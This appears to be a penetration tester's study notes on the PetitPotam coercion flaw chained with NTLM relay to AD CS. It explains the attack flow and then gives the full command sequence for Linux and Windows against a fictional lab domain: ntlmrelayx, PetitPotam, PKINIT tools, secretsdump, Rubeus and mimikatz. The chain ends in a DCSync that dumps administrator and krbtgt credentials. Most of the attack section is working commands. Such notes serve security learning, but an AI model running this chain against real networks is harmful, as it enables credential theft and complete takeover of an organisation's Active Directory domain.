# PetitPotam

## <mark style="color:yellow;">ABOUT</mark>

<mark style="color:red;">**PetitPotam**</mark> **(CVE-2021-36942)** is an <mark style="color:purple;">**LSA spoofing vulnerability**</mark> patched in <mark style="color:yellow;">**August 2021**</mark>.&#x20;

It allows an unauthenticated attacker to coerce a Domain Controller (DC) into authenticating to a malicious host via NTLM over LSARPC (port 445) by abusing the MS-EFSRPC interface. When combined with misconfigured **Active Directory Certificate Services (AD CS)**, the attacker can relay this authentication to the CA’s Web Enrollment interface, submit a malicious **Certificate Signing Request (CSR)**, and obtain a certificate usable for domain compromise.

### <mark style="color:blue;">Prerequisites</mark>

* EFSRPC or Print Spooler enabled on DC
* AD CS with **Web Enrollment + vulnerable template**
* SMB signing not required (or relaying to HTTP)
* <mark style="color:green;">`PetitPotam`</mark> + <mark style="color:green;">`Impacket`</mark> + <mark style="color:green;">`Certipy`</mark>

## <mark style="color:yellow;">FLOW</mark>

> Vulnerability itself only coercing an auth. But as example if we combine it to NTLM relay to ADCS, we could make a big impact.

### <mark style="color:blue;">1. Getting TGT</mark>

1. Setup the Trap with <mark style="color:green;">`ntlmrelayx.py`</mark>
2. Force Auth with <mark style="color:green;">`PetitPotam.py`</mark> so DC is trying to auth to us
3. Relay the Auth to ADCS
4. Get the Cert if ADCS is misconfigured, so it thinks we are DC
5. Become DC (Kerberos). We could use cert to ask for DC's TGT.

> After getting DC's TGT there are different options:

6. **DCSync with using TGT**

### <mark style="color:blue;">**2. Stealing Hash for DCSync**</mark>

1. **Using the TGT**: The tool uses the TGT in your cache to communicate with the Key Distribution Center (KDC).
2. **User-to-User Request**: It sends a Kerberos User-to-User (U2U) request to the KDC, asking for a Service Ticket for the DC machine account.
3. **PAC**: The service ticket contains a Privileged Attribute Certificate (PAC) with the NTLM hash of the machine account.
4. **Decrypting the Ticket**: Using the AS-REP encryption key from TGT we captured earlier, the tool decrypts the ticket and extracts the PAC, which includes the NTLM hash.
5. **Extracting the Hash**: The NTLM hash (e.g., <mark style="color:green;">`313b6f...`</mark>) is then extracted from the PAC data.

### <mark style="color:blue;">3. Stealing Base64 Cert for TGT and PTT</mark>

> Here we are using Rubeus and mimikatz, so this variation is for windows

1. **Get a base64 Cert** (from <mark style="color:green;">`ntlmrelayx.py`</mark> part)
2. Using <mark style="color:green;">`Rubeus`</mark> with cert for TGT request
3. Confirming ticket in memory
4. **DCSync** with <mark style="color:green;">`mimikatz`</mark>

## <mark style="color:yellow;">LINUX</mark>

#### Starting ntlmrelay.py

> Here we are relaying NTLM request and getting a AD CS certificate

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://EA-CA01.MILITECH.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

#### PetitPotam

```bash
python3 PetitPotam.py 13.13.13.13 37.37.37.37 # 13th is attacker IP, 37 is DC 
```

#### Requesting TGT with **gettgtpkinit.py**

```bash
python3 /opt/PKINITtools/gettgtpkinit.py MILITECH.LOCAL/EA-DC01\$ -pfx-base64 MIISKBdGmY= dc01.ccache
```

#### Setting TGT Environment Variable

```bash
export KRB5CCNAME=dc01.ccache
```

#### Using DC's TGT for DCSync

```bash
secretsdump.py -just-dc-user MILITECH/administrator -k -no-pass "EA-DC01$"@EA-DC01.MILITECH.LOCAL
```

***

> This is part from point 2 in Flow section, where getting hash for TGT. That's why I separated it with line above.

**TGS Request to extract a hash**&#x20;

```bash
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836asdasd MILITECH.LOCAL/EA-DC01$
```

#### DCSync by using hash

```bash
secretsdump.py -just-dc-user MILITECH/administrator "EA-DC01$"@13.13.13.13 -hashes aad3c435b:9fb4ba
```

## <mark style="color:yellow;">WINDOWS</mark>

#### **Requesting TGT and Performing PTT**

```powershell
PS C:\> .\Rubeus.exe asktgt /user:MILITECH-EA-DC01$ /certificate:MIIStgsFSADFfksCRy4= /ptt
```

#### Confirming Ticket

```powershell
PS C:\> klist
```

#### DCSync with Mimikatz

```powershell
PS C:\> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:militech\krbtgt
```

## <mark style="color:yellow;">RESOURCES</mark>

{% embed url="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-efsr" %}
